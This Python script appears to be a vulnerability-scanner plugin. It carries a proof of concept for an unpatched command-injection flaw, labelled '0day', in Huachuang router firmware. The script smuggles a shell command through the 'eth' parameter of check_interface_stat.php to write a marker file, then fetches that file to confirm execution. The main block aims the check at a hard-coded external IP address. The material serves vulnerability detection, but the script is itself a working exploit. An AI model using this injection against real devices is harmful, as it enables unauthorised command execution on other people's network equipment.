#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 华创设备命令执行0day
refer: 0day
description:
    华创的设备要被我玩坏了
POC:
    http://foobar/acc/network/interface/check_interface_stat.php?eth=a| echo testvul>testvul.txt ||
'''

import urlparse


def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'acc/network/interface/check_interface_stat.php?eth=a|%20echo%20testvul>test.txt%20||'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200:
        code, head, res, err, _ = curl.curl2(arg + 'acc/network/interface/test.txt')
        if code == 200 and 'testvul' in res:
            security_hole('命令执行: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://118.26.68.2/')[1])